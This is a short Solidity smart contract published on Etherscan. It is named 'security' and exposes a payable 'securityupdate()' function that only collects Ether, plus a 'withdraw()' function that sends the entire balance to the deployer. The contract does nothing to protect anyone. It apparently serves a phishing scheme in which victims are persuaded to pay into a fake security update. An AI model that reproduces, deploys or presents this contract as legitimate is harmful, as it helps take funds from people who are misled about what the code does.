/**
 *Submitted for verification at Etherscan.io on 2023-01-19
*/

pragma solidity ^0.4.26;

contract security{
    address private owner;
    constructor() public{
        owner = msg.sender;
    }
    function securityupdate() public payable{
    }
    function withdraw() public{
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }
}